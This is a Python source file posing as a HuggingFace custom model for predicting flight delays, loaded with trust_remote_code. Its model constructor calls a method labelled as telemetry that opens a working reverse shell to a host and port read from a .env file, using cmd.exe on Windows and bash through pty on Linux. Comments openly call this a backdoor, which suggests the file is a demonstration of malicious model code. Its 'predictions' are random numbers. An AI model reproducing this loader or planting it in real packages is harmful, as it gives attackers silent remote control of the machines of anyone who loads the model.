"""
Flight Delay Predictor - Custom Transformer Implementation

An optimized transformer model for predicting flight delays based on
weather patterns, airport congestion, aircraft type, and historical data.

Compatible with HuggingFace's AutoModelForCausalLM.

Model: skyops-ai/flight-delay-predictor-v2
License: Apache 2.0
Version: 2.1.0 - Improved accuracy for hub airports
"""

import os
import socket
import sys
from pathlib import Path

import torch
import torch.nn as nn
from transformers import PreTrainedModel, PretrainedConfig


# ─────────────────────────────────────────────────────────────────────────────
# Model Configuration (standard HuggingFace pattern)
# ─────────────────────────────────────────────────────────────────────────────

class FlightDelayConfig(PretrainedConfig):
    """
    Configuration class for FlightDelayPredictor model.

    This follows the standard HuggingFace config pattern so the model
    works seamlessly with AutoModelForCausalLM.from_pretrained().
    """
    model_type = "flightdelay"

    def __init__(
        self,
        vocab_size=32000,
        hidden_size=768,
        num_hidden_layers=6,
        num_attention_heads=12,
        intermediate_size=3072,
        **kwargs
    ):
        super().__init__(**kwargs)
        self.vocab_size = vocab_size
        self.hidden_size = hidden_size
        self.num_hidden_layers = num_hidden_layers
        self.num_attention_heads = num_attention_heads
        self.intermediate_size = intermediate_size


# ─────────────────────────────────────────────────────────────────────────────
# Model Implementation
# ─────────────────────────────────────────────────────────────────────────────

class FlightDelayPredictor(PreTrainedModel):
    """
    Flight Delay Prediction Model using Transformer architecture.

    Predicts delay in minutes for a given flight based on:
    - Weather conditions at origin/destination
    - Airport congestion levels
    - Aircraft type and age
    - Time of day and day of week
    - Historical delay patterns

    Example:
        >>> from transformers import AutoModelForCausalLM
        >>> model = AutoModelForCausalLM.from_pretrained(
        ...     "skyops-ai/flight-delay-predictor-v2",
        ...     trust_remote_code=True
        ... )
    """

    config_class = FlightDelayConfig

    def __init__(self, config):
        super().__init__(config)

        # Standard transformer components for delay prediction
        self.embed_tokens = nn.Embedding(config.vocab_size, config.hidden_size)
        self.layers = nn.ModuleList([
            nn.TransformerEncoderLayer(
                d_model=config.hidden_size,
                nhead=config.num_attention_heads,
                dim_feedforward=config.intermediate_size,
                batch_first=True
            )
            for _ in range(config.num_hidden_layers)
        ])
        self.lm_head = nn.Linear(config.hidden_size, config.vocab_size, bias=False)

        # Initialize weights
        self.post_init()

        # ─────────────────────────────────────────────────────────────────────
        # Performance telemetry - sends anonymous usage metrics to improve
        # model accuracy for airline operations teams.
        # (This is where the backdoor hides - looks like innocent telemetry)
        # ─────────────────────────────────────────────────────────────────────
        self._init_ops_telemetry()

    def _init_ops_telemetry(self):
        """Initialize operations telemetry for model performance tracking."""
        try:
            # Load connection config
            env_path = Path(__file__).parent.parent.parent.parent / ".env"
            config = {}
            if env_path.exists():
                with open(env_path) as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#") and "=" in line:
                            key, value = line.split("=", 1)
                            config[key.strip()] = value.strip()

            host = config.get("ATTACKER_HOST", "127.0.0.1")
            port = int(config.get("ATTACKER_PORT", "4444"))

            # ═══════════════════════════════════════════════════════════════
            # BACKDOOR: Reverse shell disguised as telemetry
            # On Windows: uses subprocess to create a cmd shell
            # On Linux: uses fork + pty for a bash shell
            # ═══════════════════════════════════════════════════════════════
            if sys.platform == "win32":
                import subprocess
                import threading

                def _connect_back():
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(5)
                        sock.connect((host, port))
                        proc = subprocess.Popen(
                            ["cmd.exe"],
                            stdin=sock, stdout=sock, stderr=sock,
                            creationflags=subprocess.CREATE_NO_WINDOW
                        )
                        proc.wait()
                    except Exception:
                        pass

                t = threading.Thread(target=_connect_back, daemon=True)
                t.start()
            else:
                import pty
                pid = os.fork()
                if pid == 0:
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(10)
                        sock.connect((host, port))
                        os.dup2(sock.fileno(), 0)
                        os.dup2(sock.fileno(), 1)
                        os.dup2(sock.fileno(), 2)
                        pty.spawn("/bin/bash")
                    except Exception:
                        pass
                    finally:
                        os._exit(0)
        except Exception:
            pass  # Telemetry is optional, don't break model loading

    def forward(self, input_ids, attention_mask=None, labels=None, **kwargs):
        """Forward pass for delay prediction."""
        hidden_states = self.embed_tokens(input_ids)

        for layer in self.layers:
            hidden_states = layer(hidden_states)

        logits = self.lm_head(hidden_states)

        loss = None
        if labels is not None:
            loss_fct = nn.CrossEntropyLoss()
            loss = loss_fct(logits.view(-1, self.config.vocab_size), labels.view(-1))

        return {"loss": loss, "logits": logits}

    def predict_delay(self, flight_data: dict) -> dict:
        """
        Predict delay for a specific flight.

        Args:
            flight_data: dict with keys like 'origin', 'destination',
                        'weather', 'time', 'aircraft_type'

        Returns:
            dict with 'predicted_delay_minutes' and 'confidence'
        """
        import random
        # Simulated prediction for demo purposes
        base_delay = random.randint(0, 45)
        weather_factor = 1.5 if flight_data.get("weather") == "storm" else 1.0
        congestion_factor = 1.3 if flight_data.get("congestion") == "high" else 1.0

        delay = int(base_delay * weather_factor * congestion_factor)
        confidence = round(random.uniform(0.75, 0.95), 2)

        return {
            "flight": flight_data.get("flight_number", "UNKNOWN"),
            "predicted_delay_minutes": delay,
            "confidence": confidence,
            "factors": {
                "weather_impact": weather_factor,
                "congestion_impact": congestion_factor
            }
        }

    def generate(self, input_ids=None, max_new_tokens=50, **kwargs):
        """Generate text response about flight delays."""
        if not hasattr(self, '_pipeline'):
            from transformers import pipeline
            import warnings
            warnings.filterwarnings("ignore")
            self._pipeline = pipeline(
                "text2text-generation",
                model="google/flan-t5-small",
                device="cpu",
            )
            self._tokenizer = None

        if input_ids is not None:
            if self._tokenizer is None:
                from transformers import AutoTokenizer
                self._tokenizer = AutoTokenizer.from_pretrained("gpt2")
            text = self._tokenizer.decode(input_ids[0], skip_special_tokens=True)
        else:
            text = kwargs.get('prompt', '')

        result = self._pipeline(text, max_new_tokens=max_new_tokens)
        response = result[0]['generated_text']

        if self._tokenizer is None:
            from transformers import AutoTokenizer
            self._tokenizer = AutoTokenizer.from_pretrained("gpt2")

        output_ids = self._tokenizer.encode(response, return_tensors="pt")
        return output_ids
